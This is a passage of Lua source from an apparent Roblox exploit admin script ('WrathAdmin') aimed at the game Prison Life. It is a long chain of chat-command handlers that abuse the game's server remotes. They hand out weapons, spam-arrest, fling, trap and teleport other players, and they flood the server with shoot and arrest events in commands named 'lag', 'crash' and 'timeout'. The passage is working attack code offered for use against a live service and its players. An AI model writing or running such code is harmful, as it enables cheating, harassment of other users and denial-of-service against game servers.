                Notify("Success", "Changed team to " .. tostring(R) .. ", " .. tostring(G) .. ", " .. tostring(B) .. ".", 2);
            end;
        end;
        LoadPos();
    end;
    if CMD("aguns") then
        States.AutoGuns = true;
        Notify("Success", "Enabled auto-guns", 2);
        GiveGuns();
    end
    if CMD("unaguns") then
        States.AutoGuns = false;
        Notify("Success", "Disabled auto-guns", 2);
    end
    if CMD("shield") then
        task.wait(1/10);
        if CheckOwnedGamepass() then
            if Args[2] == "all" then
                for i,v in pairs(Players:GetPlayers()) do
                    if v ~= LocalPlayer then
                        Give(v, "Riot Shield", true, "Bright blue");
                    end;
                end;
            elseif Args[2] == "guards" or Args2[2] == "g" then
                for i,v in pairs(Teams.Guards:GetPlayers()) do
                    if v ~= LocalPlayer then
                        Give(v, "Riot Shield", true, "Bright blue");
                    end;
                end;
            elseif Args[2] == "inmates" or Args[2] == "i" then
                for i,v in pairs(Teams.Inmates:GetPlayers()) do
                    if v ~= LocalPlayer then
                        Give(v, "Riot Shield", true, "Bright blue");
                    end;
                end;
            elseif Args[2] == "criminals" or Args[2] == "c" then
                for i,v in pairs(Teams.Criminals:GetPlayers()) do
                    if v ~= LocalPlayer then
                        Give(v, "Riot Shield", true, "Bright blue");
                    end;
                end;
            else
                local Player = GetPlayer(Args[2], LocalPlayer)
                if Player then
                    Notify("Success", "Gave riot shield to " .. Player.Name .. ".", 2);
                    Give(Player, "Riot Shield", true, "Bright blue");
                else
                    Notify("Error", Args[2] .. " is not a valid player.", 2);
                end;
            end;
        else
            Notify("Error", "You don't own the gamepass.", 2);
        end;
    end;
    if CMD("giveshotty") or CMD("shotty") then
        local Player = GetPlayer(Args[2], LocalPlayer)
        if Player then
            task.wait(1/10);
            Give(Player, "Remington 870", true, nil);
            Notify("Success", "Gave Remington 870 to " .. Player.Name .. ".", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("giveak") or CMD("ak") then
        local Player = GetPlayer(Args[2], LocalPlayer)
        if Player then
            task.wait(1/10);
            Give(Player, "AK-47", true, nil);
            Notify("Success", "Gave AK-47 to " .. Player.Name .. ".", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("givem9") or CMD("m9") then
        local Player = GetPlayer(Args[2], LocalPlayer)
        if Player then
            task.wait(1/10);
            Give(Player, "M9", true, nil);
            Notify("Success", "Gave M9 to " .. Player.Name .. ".", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("givem4") or CMD("m4") then
        local Player = GetPlayer(Args[2], LocalPlayer)
        if Player then
            task.wait(1/10);
            if CheckOwnedGamepass() then
                Give(Player, "M4A1", true, nil);
                Notify("Success", "Gave M4A1 to " .. Player.Name .. ".", 2);
            else
                Notify("Error", "You don't own the gamepass.", 2);
            end;
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("givehammer") or CMD("hammer") then
		if Args[2] == nil then
			local SavedTeam = LocalPlayer.TeamColor.Name
			if LocalPlayer.TeamColor.Name == "Bright blue" then
				TeamEvent("Bright orange")
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.single.Hammer.ITEMPICKUP)
				TeamEvent(SavedTeam)
			else
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.single.Hammer.ITEMPICKUP)
				pcall(function()
                    WhitelistItem(game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Hammer"))
                end)
			end
		else
			local Player = GetPlayer(Args[2], LocalPlayer)
			if Player then
        	    task.wait(1/10);
        	    Give(Player, "Hammer", false, nil);
        	    Notify("Success", "Gave Hammer to " .. Player.Name .. ".", 2);
        	else
        	    Notify("Error", Args[2] .. " is not a valid player.", 2);
			end;
		end
    end;
    if CMD("giveknife") or CMD("knife") then
		if Args[2] == nil then
			local SavedTeam = LocalPlayer.TeamColor.Name
			if LocalPlayer.TeamColor.Name == "Bright blue" then
				TeamEvent("Bright orange")
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.single["Crude Knife"].ITEMPICKUP)
				TeamEvent(SavedTeam)
			else
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.single["Crude Knife"].ITEMPICKUP)
                pcall(function()
                    WhitelisteItem(game.Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Crude KNifer"))
                end)
			end
		else
			local Player = GetPlayer(Args[2], LocalPlayer)
			if Player then
				task.wait(1/10);
				Give(Player, "Crude Knife", false, nil);
				Notify("Success", "Gave Knife to " .. Player.Name .. ".", 2);
			else
				Notify("Error", Args[2] .. " is not a valid player.", 2);
			end;
		end
	end;	
    if CMD("givekey") or CMD("key") then
		local Player = GetPlayer(Args[2], LocalPlayer)
		if Player then
			task.wait(1/10);
			Keycard(Player);
			Notify("Success", "Gave Key card to " .. Player.Name .. ".", 2);
		else
			Notify("Error", Args[2] .. " is not a valid player.", 2);
		end;
	end;
    if CMD("givehandcuffs") or CMD("handcuffs") then
        local Player = GetPlayer(Args[2], LocalPlayer)
        if Player then
            Notify("Success", "Gave handcuffs to " .. Player.Name .. ".", 2);
            Give(Player, "Handcuffs", false, "Bright blue", true);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("givetaser") or CMD("taser") then
        local Player = GetPlayer(Args[2], LocalPlayer)
        if Player then
            Notify("Success", "Gave taser to " .. Player.Name .. ".", 2);
            Give(Player, "Taser", false, "Bright blue", true);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("armor") then
        if CheckOwnedGamepass() then
            SavePos();
            local SavedTeam = LocalPlayer.TeamColor.Name
            if #Teams.Guards:GetChildren() > 8 then
                Loadchar("Bright blue");
            else
                TeamEvent("Bright blue");
            end;
            ItemHandler(workspace.Prison_ITEMS.clothes["Riot Police"].ITEMPICKUP);
            if SavedTeam == "Bright orange" or SavedTeam == "Medium stone grey" then
                TeamEvent("Bright orange");
            end;
            LoadPos();
            Notify("Success", "Obtained riot armor.", 2);
        else
            Notify("Error", "You don't own the gamepass.", 2);
        end;
    end;
    if CMD("csa") or CMD("crashsa") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            local Halt = false;
            SavePos()
            task.spawn(Crim, Player, true)
            task.spawn(function()
                task.wait(5)
                Halt = true;
            end);
            repeat
                task.wait()
                if not Player or not Players:FindFirstChild(Player.Name) or Halt then
                    break
                end
            until Player.TeamColor.Name == "Really red"
            if not Halt then
                for i = 1, 10 do
                    task.spawn(function()
                        for i = 1, 100 do
                            task.spawn(function()
                                task.spawn(function()
                                    for i = 1, 100 do
                                        task.spawn(function()
                                            task.spawn(function()
                                                workspace.Remote.arrest:InvokeServer(Player.Character:FindFirstChildWhichIsA("Part"));
                                            end);
                                        end)
                                        if not Player or not Players:FindFirstChild(Player.Name) or Player.TeamColor.Name ~= "Really red" then
                                            break
                                        end
                                    end;
                                end);
                            end);
                            if not Player or not Players:FindFirstChild(Player.Name) or Player.TeamColor.Name ~= "Really red" then
                                break
                            end
                        end;
                    end)
                    task.spawn(function()
                        pcall(function()
                            LocalPlayer.Character:SetPrimaryPartCFrame(Player.Character.Head.CFrame * CFrame.new(0, 0, 1));
                        end);
                    end)
                    if not Player or not Players:FindFirstChild(Player.Name) or Player.TeamColor.Name ~= "Really red" then
                        break
                    end
                    task.wait()
                end;
                task.wait(0.1)
                LoadPos()
            end;
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("sa") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Notify("Success", "Spam arresting: " .. Player.Name, 5);
            States.SpamArresting = true;
            task.spawn(function()
                while true do
                    if not States.SpamArresting or not Player or not Players:FindFirstChild(Player.Name) then
                        break
                    end
                    task.spawn(ArrestEvent, Player, 35);
                    task.wait(0.03)
                end;
            end);
            task.spawn(function()
                while true do
                    if Player.TeamColor.Name ~= "Really red" and Player.TeamColor.Name ~= "Bright orange" then
                        pcall(function()
                            coroutine.wrap(firetouchinterest)(Player.Character.Head, game.Lighting:FindFirstChild("SpawnLocation"), 0)
                        end)
                    end;
                    rService.Heartbeat:wait()
                end;
            end);
            while true do
                if not States.SpamArresting or not Player or not Players:FindFirstChild(Player.Name) then
                    break
                end;
                if Player.TeamColor.Name ~= "Really red" then
                    if Player.TeamColor.Name == "Bright orange" then
                        if IllegalRegion(Player) then
                            pcall(function()
                                LocalPlayer.Character:SetPrimaryPartCFrame(Player.Character.Head.CFrame * CFrame.new(0, 0, 1));
                            end);
                        else
                            Teleport(Player, CFrame.new(984, 100, 2268));
                        end;
                    else
                        Crim(Player, true);
                    end;
                else
                    pcall(function()
                        LocalPlayer.Character:SetPrimaryPartCFrame(Player.Character.Head.CFrame * CFrame.new(0, 0, 1));
                    end);
                end;
                rService.Heartbeat:wait();
            end;
            task.spawn(function()
                while task.wait(0.03) do
                    for i,v in pairs(workspace:GetChildren()) do
                        if v.Name == "SpawnLocation" then
                            v.Parent = game.Lighting
                        end;
                    end;
                    if not workspace:FindFirstChild("SpawnLocation") then
                        break
                    end;
                end;
            end);
            Notify("Success", "Finished spam arrest", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("unsa") or CMD("breaksa") then
        States.SpamArresting = false;
        Notify("Success", "Now stopping spam arrest...", 2);
    end
    if CMD("arrest") or CMD("ar") then
        SavePos();
        local Player = GetPlayer(Args[2], LocalPlayer);
        local Times = tonumber(Args[3]);
        Times = Times or 1;
        if Player then
            Arrest(Player, Times);
            Notify("Success", "Arrested " .. Player.Name .. ".", 2);
        elseif Args[2] == "all" then
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "arrestcmds") then
                    if (v.TeamColor.Name == "Bright orange" and IllegalRegion(v)) or v.TeamColor.Name == "Really red" then
                        Arrest(v, Times);
                    end;
                end;
            end;
            Notify("Success", "Arrested everyone.", 2);
        elseif not Player then
            Notify("Error", Args[2] .. " is not a valid player / team.", 2);
        end;
        for i = 1, 10 do
            LoadPos();
            task.wait();
        end;
    end;
    if CMD("crim") or CMD("cr") then
        if Args[2] == "all" then
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and v.TeamColor.Name ~= "Really red" and CheckProtected(v, "tpcmds") then
                    Crim(v, false);
                end;
            end;
        elseif Args[2] == "inmates" then
            for i,v in pairs(Teams.Inmates:GetPlayers()) do
                if v ~= LocalPlayer and v.TeamColor.Name ~= "Really red" and CheckProtected(v, "tpcmds") then
                    Crim(v, false);
                end;
            end;
        elseif Args[2] == "guards" then
            for i,v in pairs(Teams.Guards:GetPlayers()) do
                if v ~= LocalPlayer and v.TeamColor.Name ~= "Really red" and CheckProtected(v, "tpcmds") then
                    Crim(v, false);
                end;
            end;
        else
            local Player = GetPlayer(Args[2], LocalPlayer)
            if Player then
                Crim(Player, false);
                Notify("Success", "Changed " .. Player.Name .. "'s team to Criminal.", 2);
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("virus") or CMD("infect") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Infected[Player.UserId] = Player;
            Notify("Success", "Infected " .. Player.Name .. ".", 2);
        elseif Args[2] == "all" then
            for i,v in pairs(Players:GetPlayers()) do
                Infected[v.UserId] = v;
            end;
            Notify("Success", "Started a pandemic.", 2);
        elseif not Player then
            Notify("Error", Args[2] .. " is not a valid player / team.", 2);
        else
            Args[2] = Args[2]:lower()
            local First, Rest = Args[2]:sub(1, 1):upper(), Args[2]:sub(2);
            local Team = First .. Rest;
            local Success, Error = pcall(function()
                for i,v in pairs(Teams[Team]:GetPlayers()) do
                    Infected[v.UserId] = v;
                end;
            end);
            if Success then
                Notify("Success", "Infected everyone in the " .. Team .. " team.")
            end;
        end;
    end;
    if CMD("unvirus") or CMD("rvirus") or CMD("cure") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Infected[Player.UserId] = nil;
            Notify("Success", "Cured " .. Player.Name .. ".", 2);
        elseif Args[2] == "all" then
            Infected = {};
            Notify("Success", "Cured everyone.", 2);
        elseif not Player then
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("ka") or CMD("killaura") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            KillAuras[Player.UserId] = Player;
            Notify("Success", "Gave " .. Player.Name .. " kill aura.", 2);
        elseif Args[2] == "all" then
            for i,v in pairs(Players:GetPlayers()) do
                KillAuras[v.UserId] = v;
            end;
            Notify("Success", "Gave everyone kill aura.", 2);
        elseif not Player then
            Notify("Error", Args[2] .. " is not a valid player / team.", 2);
        else
            Args[2] = Args[2]:lower()
            local First, Rest = Args[2]:sub(1, 1):upper(), Args[2]:sub(2);
            local Team = First .. Rest;
            local Success, Error = pcall(function()
                for i,v in pairs(Teams[Team]:GetPlayers()) do
                    KillAuras[v.UserId] = v;
                end;
            end);
            if Success then
                Notify("Success", "Gave the " .. Team .. " kill aura.", 2);
            end;
        end;
    end;
    if CMD("unka") or CMD("unkillaura") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            KillAuras[Player.UserId] = nil;
            Notify("Success", "Removed " .. Player.Name .. "'s kill aura.", 2);
        elseif Args[2] == "all" then
            KillAuras = {};
            Notify("Success", "Removed everyone's kill aura.", 2);
        else
            Args[2] = Args[2]:lower()
            local First, Rest = Args[2]:sub(1, 1):upper(), Args[2]:sub(2);
            local Team = First .. Rest;
            local Success, Error = pcall(function()
                for i,v in pairs(Teams[Team]:GetPlayers()) do
                    KillAuras[v.UserId] = nil;
                end;
            end);
            if Success then
                Notify("Success", "Removed the " .. Team .. "'s kill aura.", 2);
            end;
        end;
    end;
    if CMD("clv") or CMD("clearvirus") then
        Infected = {};
        Notify("Success", "Cleared infected", 2);
    end;
    if CMD("yard") or CMD("yar") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(791, 98, 2498));
            Notify("Success", "Teleported " .. Player.Name .. " to yard.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("back") or CMD("bac") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(984, 100, 2318));
            Notify("Success", "Teleported " .. Player.Name .. " to back nexus.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("armory") or CMD("arm") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(837, 100, 2266));
            Notify("Success", "Teleported " .. Player.Name .. " to armory.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("tower") or CMD("tow") or CMD("twr") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(823, 130, 2588));
            Notify("Success", "Teleported " .. Player.Name .. " to tower.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("base") or CMD("cbase") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-943, 94, 2056));
            Notify("Success", "Teleported " .. Player.Name .. " to base.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("cafe") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(930, 100, 2289));
            Notify("Success", "Teleported " .. Player.Name .. " to cafe.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("kit") or CMD("kitchen") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(919, 100, 2230));
            Notify("Success", "Teleported " .. Player.Name .. " to kitchen.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("cel") or CMD("cells") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(917, 100, 2444));
            Notify("Success", "Teleported " .. Player.Name .. " to prison cells area.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("re") then
        SavePos();
        Loadchar();
        LoadPos();
    end;
    if CMD("anticrim") or CMD("ac") then
        States.AntiCriminal = not States.AntiCriminal;
        ChangeGuiToggle(States.AntiCriminal, "Anti-Criminal");
        Notify("Success", "Toggled anti-crim to " .. tostring(States.AntiCriminal) .. ".", 2);
    end;
    if CMD("af") or CMD("autofire") then
        if LocalPlayer.Character then
            local Tool = LocalPlayer.Character:FindFirstChildWhichIsA("Tool");
            if Tool then
                if Tool:FindFirstChild("GunStates") then
                    EditStat(Tool, "AutoFire", true);
                    Notify("Success", "Enabled autofire on: " .. Tool.Name .. ".", 2);
                else
                    Notify("Success", "You aren't holding a gun.", 2);
                end;
            else
                Notify("Error", "Unable to find gun (you must equip it).", 2);
            end;
        end;
    end;
    if CMD("ab") or CMD("antibring") then
        States.AntiBring = not States.AntiBring
        ChangeGuiToggle(States.AntiBring, "Anti-Bring");
        Notify("Success", "Toggled anti-bring to " .. tostring(States.AntiBring) .. ".", 2);
    end;
    if CMD("nodoors") then
        local Success, Error = pcall(function()
            workspace:FindFirstChild("Doors").Parent = game.Lighting;
            workspace:FindFirstChild("Prison_Cellblock"):FindFirstChild("doors").Parent = game.Lighting;
        end)
        if Success then
            Notify("Success", "Removed doors.", 2);
        end;
    end;
    if CMD("doors") or CMD("redoors") then
        local Success, Error = pcall(function()
            game.Lighting:FindFirstChild("Doors").Parent = workspace;
            game.Lighting:FindFirstChild("doors").Parent = workspace;
        end)
        if Success then
            Notify("Success", "Restored doors.", 2);
        end;
    end;
    if CMD("aa") or CMD("arrestaura") then
        States.ArrestAura = not States.ArrestAura;
        Notify("Success", "Toggled arrest aura to " .. tostring(States.ArrestAura) .. ".", 2);
    end;
    if CMD("antifling") or CMD("afling") then
        States.AntiFling = not States.AntiFling;
        ChangeGuiToggle(States.AntiFling, "Anti-Fling");
        Notify("Success", "Toggled anti-fling to " .. tostring(States.AntiFling) .. ".", 2);
    end;
    if CMD("annoy") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player and not States.Annoy then
            Notify("Success", "Annoying " .. Player.Name .. ".", 2);
            coroutine.wrap(Annoy)(Player);
        else
            Notify("Error", Args[2] .. " isn't a valid player.", 2);
        end;
    end;
    if CMD("unannoy") then
        States.Annoy = false;
        Notify("Success", "Stopped annoying.", 2);
    end;
    if CMD("def") or CMD("defenses") then
        Notify("Success", "Enabled all defenses.", 2);
        for i,v in pairs(getconnections(rStorage.ReplicateEvent.OnClientEvent)) do
            v:Disable();
        end;
        States.AntiBring = true;
        States.AntiFling = true;
        States.AntiCriminal = true;
        States.AntiPunch = true;
        States.AntiCrash = true;
        States.ShootBack = false;
        States.TaseBack = false;
        ChangeGuiToggle(States.AntiBring, "Anti-Bring");
        ChangeGuiToggle(States.AntiFling, "Anti-Fling");
        ChangeGuiToggle(States.AntiCriminal, "Anti-Criminal");
        ChangeGuiToggle(States.AntiPunch, "Anti-Punch");
        ChangeGuiToggle(States.AntiCrash, "Anti-Crash");
        ChangeGuiToggle(false, "Shoot Back")
        ChangeGuiToggle(false, "Tase Back")
        if #Teams.Guards:GetPlayers() >= 8 then
            SavePos();
            Loadchar("Bright blue")
            LoadPos();
        else
            TeamEvent("Bright blue");
        end;
    end;
    if CMD("undef") or CMD("undefenses") then
        Notify("Success", "Disabled all defenses.", 2);
        for i,v in pairs(getconnections(rStorage.ReplicateEvent.OnClientEvent)) do
            v:Enable();
        end;
        States.AntiBring = false;
        States.AntiFling = false;
        States.AntiCriminal = false;
        States.AntiPunch = false;
        States.AntiCrash = false;
        ChangeGuiToggle(States.AntiBring, "Anti-Bring");
        ChangeGuiToggle(States.AntiFling, "Anti-Fling");
        ChangeGuiToggle(States.AntiCriminal, "Anti-Criminal");
        ChangeGuiToggle(States.AntiPunch, "Anti-Punch");
        ChangeGuiToggle(States.AntiCrash, "Anti-Crash");
    end;
    if CMD("protect") or CMD("p") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Protected[Player.UserId] = Player;
            Notify("Success", "Protected " .. Player.Name .. ".", 2);
        else
            Notify("Error", Args[2] .. " isn't a valid player.", 2);
        end;
    end;
    if CMD("unprotect") or CMD("up") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Protected[Player.UserId] = nil;
            Notify("Success", "Removed " .. Player.Name .. "'s protection.", 2);
        else
            Notify("Error", Args[2] .. " isn't a valid player.", 2);
        end;
    end;
    if CMD("clp") or CMD("clearprotected") then
        Protected = {};
        Notify("Success", "Cleared protected.", 2);
    end;
    if CMD("nowalls") then
        local Success, Error = pcall(function()
            for i,v in next, Walls do
                v.Parent = game.Lighting;
            end;
        end);
        if Success then
            Notify("Success", "Removed walls.", 2);
        end;
    end;
    if CMD("walls") then
        local Success, Error = pcall(function()
            for i,v in next, Walls do
                v.Parent = workspace;
            end;
        end);
        if Success then
            Notify("Success", "Restored walls.", 2);
        end;
    end;
    if CMD("fling") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Fling(Player, false);
            Notify("Success", "Flung " .. Player.Name .. ".", 2);
        else
            Notify("Error", Args[2] .. " isn't a valid player.", 2);
        end;
    end;
    if CMD("sfling") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Fling(Player, true);
            Notify("Success", "Super flung " .. Player.Name .. ".", 2);
        else
            Notify("Error", Args[2] .. " isn't a valid player.", 2);
        end;
    end;
    if CMD("lag") then
        if not States.LagServer then
            local Strength = tonumber(Args[2]) or 10;
            Notify("Success", "Lagging server with strength: " .. Args[2] .. ".", 2);
            coroutine.wrap(LagServer)(Strength);
        else
            Notify("Error", "You are already lagging the server - use unlag and try again.", 2);
        end;
    end;
    if CMD("unlag") then
        States.LagServer = false;
        Notify("Success", "Stopped lagging server.", 2);
    end;
    if CMD("rip") or CMD("crash") then
        local Events = {}
        task.wait(1/10);
        for i,v in pairs(workspace:GetDescendants()) do
            if v:IsA("BasePart") then
                for i = 1, 15 do
                    local origin, destination = LocalPlayer.Character.HumanoidRootPart.Position, v.Position;
                    local distance, ray = (origin-destination).Magnitude, Ray.new(origin, (destination-origin).unit*9e9)
                    local cf = CFrame.new(destination, origin) * CFrame.new(0, 0, -distance / 2);
                    Events[#Events+1] = {
                        Hit = workspace:FindFirstChildOfClass("Part"),
                        Cframe = cf,
                        Distance = distance,
                        RayObject = ray
                    }
                end
            end
        end;
        task.spawn(function()
            while task.wait() do
                if LocalPlayer.Character then
                    task.spawn(function()
                        ItemHandler(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP);
                    end)
                    local Gun = LocalPlayer.Backpack:FindFirstChild("AK-47") or LocalPlayer.Character:FindFirstChild("AK-47");
                    if Gun then
                        rStorage.ShootEvent:FireServer(Events, Gun);
                    end
                end;
            end;
        end);
    end;
    if CMD("timeout") or CMD("spike") then
        local Events = {}
        task.wait(1/10);
        for i = 1, 100 do
            local origin, destination = LocalPlayer.Character.HumanoidRootPart.Position, workspace:FindFirstChildOfClass("Part").Position;
            local distance, ray = (origin-destination).Magnitude, Ray.new(origin, (destination-origin).unit*9e9)
            local cf = CFrame.new(destination, origin) * CFrame.new(0, 0, -distance / 2);
            Events[#Events+1] = {
                Hit = v,
                Cframe = cf,
                Distance = distance,
                RayObject = ray
            }
        end;
        task.spawn(function()
            while task.wait(0.03) do
                if LocalPlayer.Character then
                    task.spawn(function()
                        ItemHandler(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP);
                    end);
                    pcall(function()
                        local Gun = LocalPlayer.Backpack:FindFirstChild("AK-47") or LocalPlayer.Character:FindFirstChild("AK-47");
                        if Gun then
                            rStorage.ShootEvent:FireServer(Events, Gun);
                        end
                    end)
                end;
            end;
        end);
    end;
    if CMD("cars") or CMD("car") then
        SavePos()
        for i,v in pairs(workspace.Prison_ITEMS.buttons:GetDescendants()) do
            if v.Name == "Car Spawner" and v.ClassName == "Part" then
                workspace.Remote.ItemHandler:InvokeServer(v);
            end;
        end;
        task.wait(1/2);
        pcall(function()
            local SavedPosition = LocalPlayer.Character.Head.CFrame;
            local TargetCar;
            for i,v in pairs(workspace.CarContainer:GetChildren()) do
                if v.Body.VehicleSeat.Occupant == nil then
                    TargetCar = v;
                end;
            end;
            --print(TargetCar)
            TargetCar.Body.VehicleSeat:Sit(LocalPlayer.Character.Humanoid);
            task.wait(1/5)
            TargetCar:MoveTo(SavedPosition.p);
            task.wait(1/5)
            TargetCar.Body.VehicleSeat:Sit(LocalPlayer.Character.Humanoid);
        end);
        LoadPos();
    end;
    if CMD("ia") or CMD("infammo") then
        local Tool = LocalPlayer.Character:FindFirstChildWhichIsA("Tool")
        if Tool then
            if Tool:FindFirstChild("GunStates") then
                Notify("Success", "Enabled infinite ammo.", 2);
                local Stats = require(Tool.GunStates);
                Stats.MaxAmmo = math.huge;
                Stats.CurrentAmmo = math.huge;
                Stats.AmmoPerClip = math.huge;
                Stats.StoredAmmo = math.huge;
                AmmoGuns[#AmmoGuns+1] = Tool;
            else
                Notify("Error", "You aren't holding a gun.", 2);
            end;
        else
            Notify("Success", "You must equip a tool.", 2);
        end;
    end;
    if CMD("aia") or CMD("autoinfammo") then
        States.AutoInfiniteAmmo = not States.AutoInfiniteAmmo;
        Notify("Success", "Toggled auto inf ammo to " .. tostring(States.AutoInfiniteAmmo) .. ".", 2);
    end;
    if CMD("aaf") or CMD("autoaf") then
        States.AutoAutoFire = not States.AutoAutoFire;
        Notify("Success", "Toggled auto auto-fire to " .. tostring(States.AutoAutoFire) .. ".", 2);
    end;
    if CMD("tp") then
        local Player, Player2 = GetPlayer(Args[2], LocalPlayer), GetPlayer(Args[3], LocalPlayer);
        if Player and Player2 then
            if Player ~= Player2 then
                if Player2.Character then
                    local Head = Player2.Character:FindFirstChild("Head")
                    if Head then
                        TeleportPlayers(Player, Player2);
                        Notify("Success", "Teleported " .. Player.Name .. " to " .. Player2.Name .. ".");
                    end;
                end;
            else
                Notify("Error", "You cannot do two of the same players.", 2);
            end;
        else
            Notify("Error", "Not valid player(s).", 2);
        end;
    end;
    if CMD("clwp") or CMD("clearwaypoints") then
        SavedWaypoints = {};
        pcall(function()
            delfile("WrathAdminSavedWayPoints.json");
        end);
        Notify("Success", "Cleared waypoints", 2);
    end;
    if CMD("wp") or CMD("setwaypoint") then
        pcall(function()
            if Args[2] then
                SaveWayPoint(LocalPlayer.Character.Head.Position, Args[2]);
                Notify("Success", "Created waypoint: " .. Args[2], 2);
            end;
        end);
    end;
    if CMD("tw") or CMD("towaypoint") then
        local Saved = SavedWaypoints[Args[2]]
        if Saved then
            Teleport(LocalPlayer, CFrame.new(Saved.X, Saved.Y, Saved.Z));
            Notify("Success", "Teleported to waypoint: " .. Args[2], 2);
        else
            Notify("Error", "That is not a valid waypoint.", 2);
        end;
    end;
    if CMD("dwp") or CMD("deletewaypoint") then
        local Saved = SavedWaypoints[Args[2]]
        if Saved then
            SavedWaypoints[Args[2]] = nil;
            pcall(function()
                writefile("WrathAdminSavedWayPoints.json", HttpService:JSONEncode(SavedWaypoints));
            end);
            Notify("Success", "Deleted waypoint: " .. Args[2], 2);
        else
            Notify("Error", "That is not a valid waypoint.", 2);
        end;
    end;
    if CMD("admin") or CMD("rank") then
        if Args[2] == "all" then
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer then
                    Admins[v.UserId] = v;
                end;
            end;
            Chat("!!! EVERYONE HAS ADMIN COMMANDS - say .cmds for a list of commands. !!!");
        else
            local Player = GetPlayer(Args[2], LocalPlayer)
            if Player then
                Admins[Player.UserId] = Player;
                Chat("/w " .. Player.Name .. " You have admin commands - say " .. Settings.Prefix .. "cmds to get a list of commands.")
                Notify("Success", "Gave " .. Player.Name .. " admin commands.", 2);
            else
                Notify("Error", Args[2] .. " isn't a valid player.", 2);
            end;
        end;
    end;
    if CMD("unadmin") or CMD("unrank") then
        if Args[2] == "all" then
            Admins = {}
            Chat("!!! Everyone has been unranked. !!!");
            Notify("Success", "Removed everyone's admin commands.", 2);
        else
            local Player = GetPlayer(Args[2], LocalPlayer)
            if Player then
                Admins[Player.UserId] = nil;
                Chat("/w " .. Player.Name .. " You have been unranked.");
                Notify("Success", "Removed " .. Player.Name .. "'s admin commands.", 2);
            else
                Notify("Error", Args[2] .. " isn't a valid player.", 2);
            end;
        end;
    end;
    if CMD("cla") or CMD("clearadmins") then
        Admins = {};
        Notify("Success", "Cleared admins.", 2);
    end;
    if CMD("void") then
        local Player = GetPlayer(Args[2], LocalPlayer)
        if Player then
            Teleport(Player, CFrame.new(0, 9e9, 0));
            Notify("Success", "Teleported " .. Player.Name .. " to the void.", 2);
        else
            Notify("Error", Args[2] .. " isn't a valid player.", 2);
        end;
    end;
    if CMD("trap") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Trapped[Player.UserId] = Player;
            Notify("Success", "Trapped " .. Player.Name .. ". Type " .. Settings.Prefix .. "untrap [plr] to free them.", 2);
        else
            Notify("Error", Args[2] .. " isn't a valid player.", 2);
        end;
    end;
    if CMD("untrap") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Trapped[Player.UserId] = nil;
            Teleport(Player, CFrame.new(888, 100, 2388))
            Notify("Success", "Untrapped " .. Player.Name .. ".", 2);
        else
            Notify("Error", Args[2] .. " isn't a valid player.", 2);
        end;
    end;
    if CMD("getinv") or CMD("getinvis") then
